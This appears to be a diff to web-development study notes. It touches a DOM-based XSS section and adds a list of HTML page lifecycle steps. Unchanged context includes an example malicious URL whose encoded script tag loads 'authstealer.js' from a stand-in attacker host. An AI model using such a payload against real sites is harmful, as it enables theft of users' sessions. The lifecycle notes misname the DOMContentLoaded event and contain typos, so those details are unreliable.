@@ -743,7 +743,7 @@ DOM-based XSS is a type of non-persistent XSS attack that injected malacious scr
 A malicious url:
 
 ```html
-http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E 
+http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
 ```
 
 Actual content:
@@ -1046,3 +1046,21 @@ source.onmessage = function(event) {
 ```
 
 1. [SSE vs WebSocket]( https://www.ibm.com/developerworks/cn/web/wa-http-server-push-with-websocket-sse/index.html)
+
+### HTML Page Lifecycle
+
+document.readyState
+
+1. document.readyState == loading
+1. execute all inline scripts and scripts after exeternal stylesheets
+1. document.DocumentContentLoaded event
+1. document.readyState == interactive
+1. wait for all defer scripts (in document order) and external stylesheets, images and other resources
+1. window.onload event
+1. window.onbeforeunload
+1. window.onunload
+
+
+async scripts are executed(in download order) in anytime before load event when download complete
+
+Place css and other resources on top of HTML file and js resource on bottom, so js doesn't block loading of other resources.
